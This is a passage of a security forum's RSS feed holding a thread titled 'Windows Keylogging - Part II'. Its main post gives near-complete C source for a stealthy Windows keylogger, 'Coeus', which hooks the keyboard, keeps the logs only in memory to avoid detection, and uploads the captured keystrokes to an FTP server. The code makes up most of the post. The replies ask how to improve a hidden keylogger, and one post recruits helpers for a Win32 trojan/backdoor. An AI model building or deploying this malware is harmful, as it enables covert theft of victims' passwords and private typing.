            <p>I’ve been messing around with keyloggers lately. Great tutorial but I admit this isn’t exactly my style of a keylogger. I’ve found a keylogger code that utilizes a batch script and C code, but to hide the batch window the creator utilizes a vbs script. Pretty much the batch script uploads the keystroke that are saved to a file. I find this method much more easier and it is interesting. I’ve just started messing around with winAPI. My question is, if I wanted to improve the code how would I go about it?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/7</link>
        <pubDate>Tue, 13 Sep 2016 11:34:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-7</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Alright, let’s try to find some people interested. In the mean time I’ll try to get to know the WinAPI better.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/6</link>
        <pubDate>Sun, 11 Sep 2016 16:51:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-6</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>How long is a few hours? Also, I’m not planning to start the project so soon. Will probably need more people on this.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/5</link>
        <pubDate>Sun, 11 Sep 2016 16:47:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-5</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Yes I’m interested, I’ll have to finish this homework and then I’ll have time later today.<br>
Will you be online in a few hours?</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/4</link>
        <pubDate>Sun, 11 Sep 2016 16:39:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-4</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>To be honest, there’s probably a thousand bugs with the multithreading, but I’m not too motivated to fix this. I’m also keen for anyone interested in helping me develop a Win32 trojan/backdoor so if you’re interested, hit me up.</p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/3</link>
        <pubDate>Sun, 11 Sep 2016 16:37:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-3</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Awesome tutorial man, like always well written.<br>
I’m thinking of diving in the WinAPI once again.<br>
<img src="https://0x00sec.org/images/emoji/twitter/+1.png?v=9" title=":+1:" class="emoji only-emoji" alt=":+1:"></p>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/2</link>
        <pubDate>Sun, 11 Sep 2016 16:34:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-2</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
      <item>
        <title>Windows Keylogging - Part II</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p><strong>Disclaimer</strong>: The synchronisation code is broken since it was written when I had very little knowledge of how it worked.</p>
<p>Following from my previous paper, <a href="https://0x00sec.org/t/windows-keylogging-part-i/99">Windows Keylogging - Part I</a>, I will be showcasing and explaining an example implementation of a Windows keylogger named <code>Coeus</code>, after the titan Coeus of Greek mythology, who represents intelligence. Note that this is one possible implementation and is not necessarily the best. To properly understand the paper, it is highly recommended that the reader look over the implementation of a basic keylogger using a keyboard hook (which I have detailed in the previous part) and also its prerequisites which include:</p>
<pre><code class="lang-makefile">Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of Windows messages and message queues
Knowledge of Windows hooks
Recommended knowledge of multi-threading
Recommended knowledge of Mutual Exclusions
Recommended knowledge of FTP
</code></pre>
<p><strong>Disclaimer</strong>: This paper is not a how-to on making malware, rather it is a report on my research from self-study and experimentation on malware and Windows internals. As a consequence, I apologize in advance for any incorrect information which may be provided. If there is any feedback on this, please leave a reply or private message me and I will address it as soon as possible.</p>
<p>Also any apologies if my code (especially the multithreading) is terrible. Not all hackers are the best programmers.</p>
<hr>
<h2>Keylogging Functionality</h2>
<p>Recall that the most basic of keyloggers should record the keystrokes as analyzed in the previous paper. For my implementation, some extra functionality will be included to make it more plausible and effective in doing its job in the outside world. As a natural result, the code will be slightly more advanced than what was already covered. The features of the keylogger are as follows:</p>
<pre><code class="lang-makefile">Threaded keystroke logging using Windows hooks
Threaded keystroke uploads using FTP
Zero disk activity
</code></pre>
<p>Using Windows hooks to capture keystrokes is a common method utilized by many existing keyloggers. A reason why it may be is because it takes advantage of threading and events which makes it efficient in the aspect of CPU consumption. Another, with regards to malware, many legitimate programs could also implement this function to achieve their own goals.</p>
<p>A vital problem with older generations of malware is that they write the keystrokes to disk and because of this, it generates some noise when doing so which could lead to its undoing. One way to combat this weakness is to directly process all keystrokes within memory and push them out through the network. Of course, this does have its downsides. If the program is always constantly sending the keystrokes out, it will become suspicious however, the rate at which this happens can be controlled to some extent.</p>
<hr>
<h1>Coding the Keylogger</h1>
<p>Before we see any of the code in the functions, let me introduce the headers, macros and global variable declarations.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;Windows.h&gt;
#include &lt;WinInet.h&gt;
#include &lt;ShlObj.h&gt;

#pragma comment(lib, "WININET")

#define DEBUG

#define NAME "Coeus"

// FTP settings
#define FTP_SERVER "127.0.0.1"
#define FTP_USERNAME "dtm"
#define FTP_PASSWORD "mySup3rSecr3tPassw0rd"
#define FTP_LOG_PATH "Coeus_Log.txt"

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define ONE_SECOND 1000
#define ONE_MINUTE ONE_SECOND * 60
#define TIMEOUT ONE_MINUTE * 1 // minutes

// global handle to hook
HHOOK ghHook = NULL;
// global handle to mutex
HANDLE ghMutex = NULL;

// global handle to log heap
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// current max size of log buffer
DWORD dwLogBufSize = 0;

// global handle to temporary buffer heap
HANDLE ghTempHeap = NULL;
// global handle to temporary buffer
LPSTR lpTempBuf = NULL;

// multithreading objects
HANDLE hTempBufHasData = NULL;
HANDLE hTempBufNoData = NULL;
</code></pre>
<p>Global variables aren’t really a <em>nice</em> method of doing things however, for the sake of simplicity of using variables across multiple threads, this was one of the options I chose. Most of these variables are just handles to the two buffers which are used with the multithreading, for example, <code>lpLogBuf</code> is the pointer to the buffer which contains the keystrokes and <code>lpTempBuf</code> is the pointer to the buffer which contains the data to be uploaded to the FTP server. The two multithreading objects <code>hTempBufHasData</code> and <code>hTempBufNoData</code> are used to signal whether the temporary buffer (upload buffer) has or has no data to upload, respectively.</p>
<p>So now let’s take a look at the main function.</p>
<hr>
<h2><code>main</code></h2>
<p>The following is the pseudocode of the <code>WinMain</code> function.</p>
<pre><code class="lang-makefile">Main
1. Create mutex to prevent more than one instance
2. Create two buffers, one to hold the keystrokes, one to upload the keystrokes
3. Initialize two events for the two buffers with multithreading
4. Start a thread to upload the keystrokes
5. Create the keyboard hook
6. Enter message loop to process keystrokes
</code></pre>
<p>Here is the code for the main function. We declare it with <code>WinMain</code> for a Windows GUI application which shows no window since there is no actual GUI code nor does it show a console since it is not a console application. In this function, we are needed to set up all the variables and other objects for the program to work, then simply enter an infinite loop to capture keystrokes.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
    // mutex to prevent other keylog instances
    ghMutex = CreateMutex(NULL, TRUE, NAME);
    if (ghMutex == NULL) {
        Fatal("Create mutex");
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        Fatal("Mutex already exists");
        ExitProcess(1);
    }

    // declare handle cleaner on exit
    atexit(CleanUp);

    // allocate heap buffer
    ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
    if (ghLogHeap == NULL) {
        Fatal("Heap create");
    }

    lpLogBuf = (LPSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
    if (lpLogBuf == NULL) {
        Fatal("Heap alloc");
    }
    dwLogBufSize = BUF_SIZ + 1;

    ghTempHeap = HeapCreate(0, dwLogBufSize, 0);
    if (ghTempHeap == NULL) {
        Fatal("Temp heap create");
    }

    lpTempBuf = (LPSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBufSize);
    if (lpTempBuf == NULL) {
        Fatal("Temp heap alloc");
    }

    // multithreading set up
    hTempBufHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
    hTempBufNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

    // create thread to send log file to ftp server
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
        Fatal("Create thread");
    }

    // set keyboard hooking subroutine
    ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (ghHook == NULL) {
        Fatal("Failed to set keyboard hook");
    }

    MSG msg;
    while (GetMessage(&amp;msg, 0, 0, 0) != 0) {
        TranslateMessage(&amp;msg);
        DispatchMessage(&amp;msg);    
    }

    UnhookWindowsHookEx(ghHook);

    return 0;
}
</code></pre>
<p>We require a mutex to prevent duplicate instances being run at the same time. Once we’ve done that, we can initialize the two heaps for our two buffers and the multithreading objects. The <code>lpTempBuf</code> buffer obviously starts with no data so we create the <code>hTempBufNoData</code> initial state as <code>TRUE</code> and the <code>hTempBufHasData</code> with <code>FALSE</code>. We’ll then create the thread for the FTP uploading routine and then set a hook on keyboard messages. Once we’ve set up everything we require, we place the main function in a message loop to retrieve keystrokes. To capture the keystrokes, we need to set up our <code>LowLevelKeyboardProc</code> function accordingly.</p>
<hr>
<h2><code>LowLevelKeyboardProc</code></h2>
<p>The following is the pseudocode of the <code>LowLevelKeyboardProc</code> function.</p>
<pre><code class="lang-makefile">LowLevelKeyboardProc
1. Check if message is a keyboard message
2. Check if key is either pressed or held
3. Parse virtual key code
4. Append the keystroke to the buffer
5. Wait until the upload buffer is empty (already uploaded) if the keystroke buffer is full
6. Else if upload buffer is not ready, skip and end the function
7. If upload buffer is ready, copy keystroke buffer to the upload buffer
8. Signal FTP routine that there is data to upload
9. Zero the keystroke buffer
10. End the function
</code></pre>
<p>This function is declared as the <code>CALLBACK</code> function to process the keystrokes provided by the hook. To record the keystrokes, we need to do some parsing of virtual key codes and some formatting of special keys.</p>
<pre><code class="lang-auto">// callback function when key is pressed
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // wParam and lParam have info about keyboard message
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        // if key is pressed or held
        if (wParam == WM_KEYDOWN) {
            // get string length of log buffer
            DWORD dwLogBufLen = strlen(lpLogBuf);

            // copy vkCode into log buffer
            CHAR key[2];
            DWORD vkCode = kbd-&gt;vkCode;
            // key is 0 - 9
            if (vkCode &gt;= 0x30 &amp;&amp; vkCode &lt;= 0x39) {
                // shift key
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                        case 0x30:
                            Log(")");
                            break;
                        case 0x31:
                            Log("!");
                            break;
                        case 0x32:
                            Log("@");
                            break;
                        case 0x33:
                            Log("#");
                            break;
                        case 0x34:
                            Log("$");
                            break;
                        case 0x35:
                            Log("%");
                            break;
                        case 0x36:
                            Log("^");
                            break;
                        case 0x37:
                            Log("&amp;");
                            break;
                        case 0x38:
                            Log("*");
                            break;
                        case 0x39:
                            Log("(");
                            break;
                    }
                    // no shift key
                } else {
                    sprintf(key, "%c", vkCode);
                    Log(key);
                }
                // key is a - z
            } else if (vkCode &gt;= 0x41 &amp;&amp; vkCode &lt;= 0x5A) {
                // if lowercase
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) &amp; 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf(key, "%c", vkCode);
                Log(key);
            // all other keys
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log("[CANCEL]");
                        break;
                    case VK_BACK:
                        Log("[BACKSPACE]");
                        break;
                    case VK_TAB:
                        Log("[TAB]");
                        break;
                    case VK_CLEAR:
                        Log("[CLEAR]");
                        break;
                    case VK_RETURN:
                        Log("[ENTER]");
                        break;
                    case VK_CONTROL:
                        Log("[CTRL]");
                        break;
                    case VK_MENU:
                        Log("[ALT]");
                        break;
                    case VK_PAUSE:
                        Log("[PAUSE]");
                        break;
                    case VK_CAPITAL:
                        Log("[CAPS LOCK]");
                        break;
                    case VK_ESCAPE:
                        Log("[ESC]");
                        break;
                    case VK_SPACE:
                        Log("[SPACE]");
                        break;
                    case VK_PRIOR:
                        Log("[PAGE UP]");
                        break;
                    case VK_NEXT:
                        Log("[PAGE DOWN]");
                        break;
                    case VK_END:
                        Log("[END]");
                        break;
                    case VK_HOME:
                        Log("[HOME]");
                        break;
                    case VK_LEFT:
                        Log("[LEFT ARROW]");
                        break;
                    case VK_UP:
                        Log("[UP ARROW]");
                        break;
                    case VK_RIGHT:
                        Log("[RIGHT ARROW]");
                        break;
                    case VK_DOWN:
                        Log("[DOWN ARROW]");
                        break;
                    case VK_INSERT:
                        Log("[INS]");
                        break;
                    case VK_DELETE:
                        Log("[DEL]");
                        break;
                    case VK_NUMPAD0:
                        Log("[NUMPAD 0]");
                        break;
                    case VK_NUMPAD1:
                        Log("[NUMPAD 1]");
                        break;
                    case VK_NUMPAD2:
                        Log("[NUMPAD 2]");
                        break;
                    case VK_NUMPAD3:
                        Log("[NUMPAD 3");
                        break;
                    case VK_NUMPAD4:
                        Log("[NUMPAD 4]");
                        break;
                    case VK_NUMPAD5:
                        Log("[NUMPAD 5]");
                        break;
                    case VK_NUMPAD6:
                        Log("[NUMPAD 6]");
                        break;
                    case VK_NUMPAD7:
                        Log("[NUMPAD 7]");
                        break;
                    case VK_NUMPAD8:
                        Log("[NUMPAD 8]");
                        break;
                    case VK_NUMPAD9:
                        Log("[NUMPAD 9]");
                        break;
                    case VK_MULTIPLY:
                        Log("[*]");
                        break;
                    case VK_ADD:
                        Log("[+]");
                        break;
                    case VK_SUBTRACT:
                        Log("[-]");
                        break;
                    case VK_DECIMAL:
                        Log("[.]");
                        break;
                    case VK_DIVIDE:
                        Log("[/]");
                        break;
                    case VK_F1:
                        Log("[F1]");
                        break;
                    case VK_F2:
                        Log("[F2]");
                        break;
                    case VK_F3:
                        Log("[F3]");
                        break;
                    case VK_F4:
                        Log("[F4]");
                        break;
                    case VK_F5:
                        Log("[F5]");
                        break;
                    case VK_F6:
                        Log("[F6]");
                        break;
                    case VK_F7:
                        Log("[F7]");
                        break;
                    case VK_F8:
                        Log("[F8]");
                        break;
                    case VK_F9:
                        Log("[F9]");
                        break;
                    case VK_F10:
                        Log("[F10]");
                        break;
                    case VK_F11:
                        Log("[F11]");
                        break;
                    case VK_F12:
                        Log("[F12]");
                        break;
                    case VK_NUMLOCK:
                        Log("[NUM LOCK]");
                        break;
                    case VK_SCROLL:
                        Log("[SCROLL LOCK]");
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log("&lt;") : Log(",");
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log("&gt;") : Log(".");
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                        break;
                }
            }

            // wait until upload buffer is ready
            // if log buffer is at max size, wait until upload is ready
            if (dwLogBufLen == MAX_LOG_SIZE - 1)
                WaitForSingleObject(hTempBufNoData, INFINITE);
            else
                // otherwise, wait for 500 ms 
                if (WaitForSingleObject(hTempBufNoData, 0) == WAIT_TIMEOUT)
                    // ignore if timed out
                    return CallNextHookEx(0, nCode, wParam, lParam);

            // write out to separate buffer
            strcpy(lpTempBuf, lpLogBuf);
            // reset event 
            ResetEvent(hTempBufNoData);
            // signal ftp upload
            SetEvent(hTempBufHasData);

            // reset log buffer size
            ZeroMemory(lpLogBuf, dwLogBufSize);
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}
</code></pre>
<p>This function is quite lengthy, purely because of the need to properly parse and format the recorded keystroke. There is a lot of hard coding involved to check the given virtual key code provided by the <code>lParam</code> parameter. In summary, switch cases are used to provide the corresponding character with a virtual key code which must be checked against the <code>SHIFT</code> key to see if any alternate keystrokes were used. For special keys such as <code>Enter</code> and <code>Caps Lock</code>, formatting is needed so that a label is recorded in place of the actual character. Of course, this is just my implementation of the formatting and by all means, it is entirely possible to have the raw character instead of a representative label.</p>
<p>After all of that has been processed, the keystrokes in the keystroke buffer must be moved into the temporary buffer for uploading. The keystroke buffer needs to be checked first before it can move on to new keystroke input. To make sure that it is always available, an infinite wait state is entered until the temporary buffer is available. When the wait state is unlocked, it will move the data in the keystroke buffer to the temporary buffer and signal for uploading, then zero out the memory for space for new keystrokes. Otherwise, it will enter a wait state which will immediately time out if the temporary buffer is not yet available and continue on.</p>
<hr>
<h2><code>FTPSend</code></h2>
<p>The following is the pseudocode for the <code>FTPSend</code> function.</p>
<pre><code class="lang-makefile">FTPSend
1. Sleep for a specified timeout period
2. Signal that the upload buffer has no data to upload
3. Wait until data has been placed into the upload buffer and is signaled
4. Initialize an FTP internet connection
5. Send an FTP append command to append the data in the upload buffer
6. Write the data to the remote file
7. Close connection and repeat indefinitely
</code></pre>
<p>A method to prevent disk activity on the target machine is to directly transfer the data over the web. The following code snippet shows how this can be done.</p>
<pre><code class="lang-auto">VOID FTPSend(VOID) {
    while (TRUE) {
        // wait until upload buffer has new data
        Sleep(TIMEOUT);
        SetEvent(hTempBufNoData);
        WaitForSingleObject(hTempBufHasData, INFINITE);

        HINTERNET hINet = InternetOpen(NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_PASSIVE);
        if (hINet == NULL)
            continue;

        HINTERNET hFTP = InternetConnect(hINet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
        if (hFTP == NULL) {
            InternetCloseHandle(hINet);
            continue;
        }

        HINTERNET hFTPFile;
        CHAR szTemp[256];
        // FTP append command
        sprintf(szTemp, "APPE %s", FTP_LOG_PATH);
        BOOL bSuccess = FtpCommand(hFTP, TRUE, FTP_TRANSFER_TYPE_ASCII, szTemp, 0, &amp;hFTPFile);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        DWORD dwWritten = 0;
        bSuccess = InternetWriteFile(hFTPFile, lpTempBuf, strlen(lpTempBuf), &amp;dwWritten);
        if (bSuccess == FALSE) {
            InternetCloseHandle(hFTP);
            InternetCloseHandle(hINet);
            continue;
        }

        InternetCloseHandle(hFTPFile);
        InternetCloseHandle(hFTP);
        InternetCloseHandle(hINet);
        ResetEvent(hTempBufHasData);
        //SetEvent(hTempBufNoData);
    }

    ExitThread(0);
}
</code></pre>
<p>There’s probably a more efficient way to do this but this is how I did it. I didn’t want to keep the handle to the FTP server because that would probably mean that the process would maintain an connection with the remote server which is not as stealthy. Inside this infinite loop, it <code>Sleep</code>s a specified timeout value <code>TIMEOUT</code> before doing anything else to try to limit the rate of connections. It will then signal that its temporary buffer has no data to upload and then enter an infinite wait state until the data in the keystroke buffer has transferred its content over. After this has been achieved, it will open an FTP internet connection and then authenticate with the server using the defined credentials. To write the keystrokes to the server, it will issue an <code>APPE</code> (append) command to the specified file location and begin writing. Once this is done, it will proceed to close the connection and repeat.</p>
<p>While writing this, I’ve realized that I should probably signal the no data object first before <code>Sleep</code>ing. I’ll keep it like so for now since I don’t want to accidentally break the code.</p>
<h2>Conclusion</h2>
<p>That’s pretty much it for the showcasing of my code. If there are any errors or concerns, please don’t hesitate to contact me and I will try to handle it ASAP. Thanks for reading and hope you’ve learned something from this.</p>
<h2>Appendix</h2>
<p>Other functions not mentioned:</p>
<pre><code class="lang-auto">// error message handler function
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
    CHAR err_buf[BUF_SIZ];

    sprintf(err_buf, "%s failed: %lu", s, GetLastError());
    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

    ExitProcess(1);
}

// clean up function on exit
VOID CleanUp(VOID) {
    if (lpLogBuf &amp;&amp; ghLogHeap) {
        HeapFree(ghLogHeap, 0, lpLogBuf);
        HeapDestroy(ghLogHeap);
    }
    if (ghHook) UnhookWindowsHookEx(ghHook);
    if (ghMutex) CloseHandle(ghMutex);
    if (lpTempBuf &amp;&amp; ghTempHeap) {
        HeapFree(ghTempHeap, 0, lpTempBuf);
        HeapDestroy(ghTempHeap);
    }
}
</code></pre>
          <p><a href="https://0x00sec.org/t/windows-keylogging-part-ii/1070/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/windows-keylogging-part-ii/1070/1</link>
        <pubDate>Sat, 10 Sep 2016 11:05:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1070-1</guid>
        <source url="https://0x00sec.org/t/windows-keylogging-part-ii/1070.rss">Windows Keylogging - Part II</source>
      </item>
  </channel>
</rss>
